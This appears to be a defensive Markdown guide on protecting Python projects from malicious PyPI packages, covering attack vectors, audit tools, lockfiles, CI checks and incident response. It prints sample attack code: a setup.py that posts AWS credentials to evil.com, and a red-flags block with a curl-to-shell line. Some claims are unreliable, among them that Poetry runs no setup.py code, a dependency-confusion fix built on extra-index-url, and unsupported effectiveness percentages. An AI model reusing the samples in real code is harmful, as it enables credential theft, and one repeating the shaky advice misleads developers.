# Python Security Guide - Comprehensive Protection Against Malware

**For:** Protecting your Python projects from malicious PyPI packages

**Scope:** Complete threat analysis, prevention strategies, tools, and incident response

---

## 📋 Table of Contents

1. [Threat Landscape](#-threat-landscape)
2. [Attack Vectors](#-attack-vectors)
3. [Defense Strategy](#-defense-strategy)
4. [pip vs Poetry Security](#-pip-vs-poetry-security)
5. [Automated Security Tools](#-automated-security-tools)
6. [Manual Verification](#-manual-verification)
7. [Lockfile Security](#-lockfile-security)
8. [CI/CD Integration](#-cicd-integration)
9. [Incident Response](#-incident-response)
10. [Best Practices](#-best-practices)
11. [Resources](#-resources)

---

## 🚨 Threat Landscape

### Types of Python Malware Attacks

PyPI (Python Package Index) hosts over 500,000 packages, making it a prime target for supply chain attacks.

#### 1. **Credential Theft**
- **What:** Malware that steals AWS credentials, API keys, environment variables
- **Impact:** Cloud account compromise, data breaches, unauthorized access
- **Example:** ctx/php packages (2022) - stole AWS credentials via setup.py

#### 2. **Data Exfiltration**
- **What:** Malware that uploads source code or configuration files to remote servers
- **Impact:** Intellectual property theft, exposure of secrets
- **Detection:** Monitor network activity during install

#### 3. **Cryptocurrency Miners**
- **What:** Malware that uses your CPU to mine cryptocurrency
- **Impact:** Slow performance, high CPU usage, increased costs (cloud)
- **Detection:** Monitor CPU usage, process names

#### 4. **Backdoors and Remote Access**
- **What:** Malware that creates reverse shells or persistent access
- **Impact:** Full system compromise, lateral movement in networks
- **Detection:** Monitor outbound connections, process creation

#### 5. **Supply Chain Poisoning**
- **What:** Compromising popular packages to affect thousands of users
- **Impact:** Widespread damage across the ecosystem
- **Example:** Requests typosquatting attacks (various years)

---

## 🎯 Attack Vectors

### 1. Typosquatting

**Definition:** Creating packages with names similar to popular packages.

**How it works:**
1. Attacker identifies popular package (e.g., `requests`)
2. Creates similar package (`reqeusts`, `request`, `python-requests`)
3. Waits for developers to make typos during installation
4. Malware executes via setup.py

**Real Examples:**
- `python3-dateutil` (typosquat of `python-dateutil`) - downloaded 17,000+ times
- `jeIlyfish` (capital I instead of l in `jellyfish`) - credential theft
- `urllib3-secure` (fake security version of `urllib3`)

**Prevention:**
```bash
# Always verify package name on PyPI first
pip show package-name
# Visit https://pypi.org/project/package-name/ to verify
```

---

### 2. Dependency Confusion

**Definition:** Exploiting how pip resolves internal vs public packages.

**How it works:**
1. Company uses internal package `company-utils` (private index)
2. Attacker discovers internal package name
3. Attacker publishes malicious `company-utils` to public PyPI
4. pip may install public version if not properly configured

**Prevention:**
```
# pip.conf - Use only official PyPI
[global]
index-url = https://pypi.org/simple/

# For private packages:
extra-index-url = https://private.company.com/simple/
```

---

### 3. Malicious setup.py Scripts

**Definition:** Packages that execute code during `pip install` via setup.py.

**How it works:**
1. Package uses setuptools with custom setup.py
2. pip runs setup.py during installation (source distributions)
3. Malware executes (steal credentials, install backdoor, etc.)

**Real Example - ctx/php (2022):**
```python
# setup.py
import os
import urllib.request

# Steal AWS credentials
aws_creds = open(os.path.expanduser('~/.aws/credentials')).read()

# Exfiltrate to attacker's server
urllib.request.urlopen('https://evil.com/collect', data=aws_creds.encode())
```

**Prevention:**
```
# pip.conf - Prefer wheels (pre-built packages)
[install]
only-binary = :all:

# Or install specific package from wheel only
pip install --only-binary package-name package-name
```

---

### 4. Compromised Maintainer Accounts

**Definition:** Attackers gain access to legitimate package maintainer accounts.

**Real Example - rest-client (Ruby, 2019):**
- While more common in npm, Python packages are also vulnerable
- Maintainer account takeovers happen via phishing, weak passwords
- Malicious versions published to PyPI
- Users auto-update to compromised version

**Prevention:**
```bash
# Use exact versions (not >= or ~=)
pip install requests==2.31.0

# Review CHANGELOG before updates
pip show requests --verbose
# Visit PyPI page to read changelog
```

---

### 5. Backdoored Dependencies

**Definition:** Malware hidden deep in dependency trees.

**How it works:**
1. You trust Package A (popular, verified)
2. Package A depends on Package B (less scrutiny)
3. Package B depends on compromised Package C
4. Malware in C affects all users of A

**Prevention:**
```bash
# Audit entire dependency tree
pip-audit
pip list --format=freeze

# Use Poetry to see dependency tree
poetry show --tree
```

---

## 🛡️ Defense Strategy

### Multi-Layer Security Approach

**Layer 1: Prevention (Block at Entry)**
- `pip.conf` configuration to prefer wheels
- Manual package verification before install
- Dependency minimization

**Layer 2: Detection (Catch During Install)**
- Automated audits (pip-audit, safety)
- Lockfile/hash verification
- CI/CD security checks

**Layer 3: Monitoring (Ongoing Protection)**
- Regular security audits
- Dependency update reviews
- Security advisory subscriptions

**Layer 4: Response (If Compromised)**
- Incident response plan
- Credential rotation procedures
- Rollback strategy

---

## 🆚 pip vs Poetry Security

### Security Comparison

| Feature | pip | Poetry |
|---------|-----|--------|
| **Lockfile** | Manual (pip-tools) | Automatic (poetry.lock) |
| **Install Scripts** | Runs setup.py ⚠️ | No install hooks ✅ |
| **Hash Verification** | Manual (--require-hashes) | Automatic ✅ |
| **Dependency Resolution** | Basic | Advanced ✅ |
| **Virtual Environment** | Manual (venv) | Automatic ✅ |
| **Security by Default** | Requires config | Better defaults ✅ |

### Why Poetry is More Secure

**1. No install hooks**
- Poetry uses modern PEP 517 build system
- Doesn't execute arbitrary setup.py code
- Builds packages in isolation

**2. Automatic lockfile with hashes**
```toml
# poetry.lock (automatic)
[[package]]
name = "requests"
version = "2.31.0"
files = [
    {file = "requests-2.31.0-py3-none-any.whl", hash = "sha256:abc123..."},
]
```

**3. Better dependency resolution**
- Resolves conflicts before install
- Prevents version confusion attacks
- Clear error messages

**Recommendation:** Use Poetry for new projects. For existing pip projects, migrate gradually or use pip-tools + pip.conf hardening.

---

## 🤖 Automated Security Tools

### 1. pip-audit (Official PyPA Tool)

**What:** Official Python vulnerability scanner.

**Installation:**
```bash
pip install pip-audit
```

**Usage:**
```bash
# Audit current environment
pip-audit

# Audit requirements file
pip-audit -r requirements.txt

# Output JSON report
pip-audit --format=json

# Fix vulnerabilities automatically
pip-audit --fix

# Set severity threshold
pip-audit --vulnerability-service=osv
```

**Configuration:**
```bash
# Create .pip-audit.toml
[pip-audit]
vulnerability-service = "osv"
format = "json"
output = "audit-report.json"
```

**Pros:** Official PyPA tool, fast, no account needed
**Cons:** Only checks known vulnerabilities (CVE/OSV database)

---

### 2. Safety

**What:** Commercial vulnerability scanner with comprehensive database.

**Installation:**
```bash
pip install safety
```

**Usage:**
```bash
# Check current environment
safety check

# Check requirements file
safety check -r requirements.txt

# Generate report
safety check --json > security-report.json

# Check with Poetry
poetry export -f requirements.txt | safety check --stdin
```

**Pros:** Large commercial database, detailed reports
**Cons:** Requires paid account for full features, commercial database

---

### 3. Bandit

**What:** Python code security linter (finds vulnerabilities in YOUR code).

**Installation:**
```bash
pip install bandit
```

**Usage:**
```bash
# Scan current directory
bandit -r .

# Generate HTML report
bandit -r . -f html -o bandit-report.html

# Scan specific severity
bandit -r . -ll  # Only high/medium severity
```

**Pros:** Finds vulnerabilities in your code, integrates with CI/CD
**Cons:** Doesn't check dependency vulnerabilities (use with pip-audit)

---

### 4. pip-autoremove

**What:** Remove unused dependencies (reduce attack surface).

**Installation:**
```bash
pip install pip-autoremove
```

**Usage:**
```bash
# List unused packages
pip-autoremove --list

# Remove specific package and its orphaned dependencies
pip-autoremove package-name

# Simulate removal (dry run)
pip-autoremove package-name --dry-run
```

---

## 🔍 Manual Verification

### Before Installing ANY Package

#### Step 1: Check Package Reputation

```bash
# View package details
pip show package-name

# Check PyPI page
# Visit https://pypi.org/project/package-name/

# See download stats (using pypistats if installed)
pip install pypistats
pypistats recent package-name
```

**Red flags:**
- < 1,000 weekly downloads (for production use)
- No GitHub repository
- No recent updates (> 2 years)
- Suspicious version jumps
- Recently created package

---

#### Step 2: Inspect Package Source

```bash
# Download without installing
pip download package-name --no-deps

# Extract wheel or source
unzip package_name-1.0.0-py3-none-any.whl -d package_inspect/
# Or for source:
tar -xzf package-name-1.0.0.tar.gz

# Check for setup.py (source distributions)
cat package-name-1.0.0/setup.py

# Look for suspicious code
grep -r "exec" package_inspect/
grep -r "eval" package_inspect/
grep -r "compile" package_inspect/
grep -r "os.system" package_inspect/
grep -r "subprocess" package_inspect/
```

**Red flags in setup.py:**
```python
# setup.py
import os
import subprocess

# ⚠️ Remote execution
os.system('curl https://evil.com | sh')

# ⚠️ Credential theft
open(os.path.expanduser('~/.aws/credentials')).read()

# ⚠️ Obfuscation
exec(__import__('base64').b64decode('...'))

# ⚠️ Network calls
import urllib.request
urllib.request.urlopen('https://evil.com/collect')
```

---

#### Step 3: Check for Wheels (Safer than Source)

```bash
# Check if package has wheels
pip index versions package-name

# Prefer wheels (no setup.py execution)
pip install --only-binary :all: package-name
```

**Source distribution (.tar.gz) ⚠️**
- Requires running setup.py during install
- Can execute arbitrary code
- Higher risk

**Wheel distribution (.whl) ✅**
- Pre-built binary package
- No code execution during install
- Much safer

---

#### Step 4: Review GitHub Repository

```bash
# Visit PyPI page to get GitHub URL
# https://pypi.org/project/package-name/

# Clone and inspect
git clone <repo-url>
cd <repo>

# Check commit history
git log --oneline --graph

# See recent changes
git diff v1.0.0..v2.0.0

# Check for suspicious files
find . -name "*.pyc"  # Compiled Python (shouldn't be in source)
find . -name "__pycache__"  # Cache dirs (shouldn't be in source)
```

---

## 🔒 Lockfile Security

### pip: requirements.txt with Hashes

**Generate with pip-tools:**
```bash
# Install pip-tools
pip install pip-tools

# Create requirements.in (input)
echo "requests==2.31.0" > requirements.in

# Generate requirements.txt with hashes
pip-compile --generate-hashes requirements.in

# Result: requirements.txt
requests==2.31.0 \
    --hash=sha256:abc123... \
    --hash=sha256:def456...
```

**Install with hash verification:**
```bash
# Verify hashes during install (CRITICAL for security)
pip install -r requirements.txt --require-hashes
```

**Why hashes matter:**
- Prevents package tampering
- Ensures integrity
- Detects supply chain attacks

---

### Poetry: poetry.lock (Automatic)

**Poetry generates lockfile automatically:**
```bash
# Add package (generates/updates poetry.lock)
poetry add requests==2.31.0

# Install from lockfile
poetry install

# Verify lockfile integrity
poetry lock --check
```

**poetry.lock includes:**
- Exact versions
- SHA-256 hashes
- Dependency tree resolution

**ALWAYS commit poetry.lock:**
```bash
git add poetry.lock pyproject.toml
git commit -m "Add dependencies with lockfile"
```

---

## 🔄 CI/CD Integration

### GitHub Actions - pip Example

```yaml
name: Python Security Audit

on:
  pull_request:
    paths:
      - 'requirements.txt'
      - 'requirements.in'
  schedule:
    - cron: '0 0 * * 1'  # Weekly

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      # Install dependencies
      - name: Install dependencies
        run: |
          pip install pip-audit safety bandit

      # Run pip-audit
      - name: pip-audit
        run: pip-audit -r requirements.txt

      # Run safety check
      - name: safety check
        run: safety check -r requirements.txt

      # Scan code with Bandit
      - name: bandit scan
        run: bandit -r . -ll
```

---

### GitHub Actions - Poetry Example

```yaml
name: Poetry Security Audit

on:
  pull_request:
    paths:
      - 'poetry.lock'
      - 'pyproject.toml'
  schedule:
    - cron: '0 0 * * 1'  # Weekly

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      # Install Poetry
      - name: Install Poetry
        uses: snok/install-poetry@v1

      # Verify lockfile
      - name: Verify poetry.lock
        run: poetry lock --check

      # Install dependencies
      - name: Install dependencies
        run: poetry install

      # Export to requirements.txt and audit
      - name: pip-audit
        run: |
          pip install pip-audit
          poetry export -f requirements.txt | pip-audit -r /dev/stdin

      # Run Bandit
      - name: Bandit scan
        run: poetry run bandit -r . -ll
```

---

## 🚨 Incident Response

### If You Discover Malicious Package

#### Immediate Actions (First 5 Minutes)

**1. Isolate the environment**
```bash
# Stop all Python processes
pkill -f python

# Disconnect from network (if possible)
sudo ifconfig en0 down  # macOS
```

**2. Identify the malicious package**
```bash
# Check recently installed packages
pip list --format=freeze

# Check for package
pip show malicious-package
```

**3. Remove the package**
```bash
# Uninstall
pip uninstall malicious-package

# Remove from virtual environment
deactivate
rm -rf .venv/

# Recreate clean environment
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt --require-hashes
```

---

#### Investigation (Next 30 Minutes)

**4. Assess damage**
```bash
# Check for modified files
find . -type f -mtime -1

# Review environment variables
env | grep -i key
env | grep -i aws
env | grep -i secret

# Check git for unauthorized changes
git status
git diff HEAD

# Review shell history
history | grep -i curl
history | grep -i wget
```

**5. Check for exfiltration**
```bash
# Review Python execution history
cat ~/.python_history

# Check network connections
sudo lsof -i -P | grep python

# Review logs
journalctl | grep python  # Linux
log show --predicate 'process == "python"' --last 1h  # macOS
```

---

#### Recovery (24-48 Hours)

**6. Rotate ALL credentials**

Assume compromised:
- AWS credentials (`~/.aws/credentials`)
- API keys (.env files)
- Database passwords
- SSH keys
- GitHub tokens
- Service account credentials

**7. Report the incident**
```
# Report to PyPI security team
# Email: security@python.org

# Report via PyPI issue tracker
# https://github.com/pypi/support/issues

# Notify package maintainer (if compromised)

# File CVE if widely used
# https://cve.mitre.org/cve/request_id.html
```

---

## ✅ Best Practices

### Complete Security Workflow

**New pip project:**
```bash
# 1. Copy pip.conf
cp /path/to/claude-config-template/pip.conf .

# 2. Create virtual environment
python -m venv .venv
source .venv/bin/activate

# 3. Install pip-tools
pip install pip-tools pip-audit

# 4. Create requirements.in
echo "requests==2.31.0" > requirements.in

# 5. Generate requirements.txt with hashes
pip-compile --generate-hashes requirements.in

# 6. Install with hash verification
pip install -r requirements.txt --require-hashes

# 7. Commit
git add pip.conf requirements.in requirements.txt
git commit -m "Add secure Python dependencies"
```

**New Poetry project:**
```bash
# 1. Initialize Poetry
poetry init

# 2. Add dependencies
poetry add requests==2.31.0

# 3. Add security tools (dev)
poetry add --group dev pip-audit safety bandit

# 4. Commit lockfile
git add poetry.lock pyproject.toml
git commit -m "Add Poetry lockfile"
```

**Weekly security routine:**
```bash
# pip
pip-audit
pip list --outdated

# Poetry
poetry export -f requirements.txt | pip-audit -r /dev/stdin
poetry show --outdated
```

---

## 🔗 Resources

### Official Documentation
- [PyPI Security](https://pypi.org/security/)
- [pip-audit Documentation](https://github.com/pypa/pip-audit)
- [Poetry Security Guide](https://python-poetry.org/docs/)
- [Python Packaging Guide](https://packaging.python.org/)

### Security Tools
- [pip-audit](https://github.com/pypa/pip-audit) - Official vulnerability scanner
- [Safety](https://pyup.io/safety/) - Commercial vulnerability database
- [Bandit](https://bandit.readthedocs.io/) - Python code security linter

### Vulnerability Databases
- [OSV (Open Source Vulnerabilities)](https://osv.dev/)
- [PyPI Security Advisories](https://github.com/pypa/advisory-database)
- [National Vulnerability Database](https://nvd.nist.gov/)

### Related Documentation (This Template)
- [Universal Package Security Principles](./02_package-security-principles.md)
- [Python Security Checklist](./03_python-security-checklist.md)
- [Automation Scripts](../../examples/python-security/)

---

## 📊 Summary

| Security Measure | Effectiveness | Effort | Priority |
|------------------|---------------|--------|----------|
| Use wheels only (pip.conf) | 80%+ | Low | ⚠️ Critical |
| pip-audit (weekly) | 60% | Low | ⚠️ Critical |
| Lockfile with hashes | 70% | Medium | ⚠️ Critical |
| Use Poetry instead of pip | 85% | Medium | ⭐ High |
| Manual package review | 90% | High | ⭐ High |
| Dependency minimization | 50% | Medium | 💡 Medium |
| CI/CD security checks | 65% | Medium | 💡 Medium |

**Key Takeaway:** Using Poetry + weekly pip-audit + lockfile commits provides 90%+ protection. For pip projects, configure `only-binary=:all:` in pip.conf to block setup.py execution.

---

**Last Updated:** 2025-12-09
**Version:** 1.0
**Applies to:** pip 23+, Poetry 1.7+, Python 3.9+
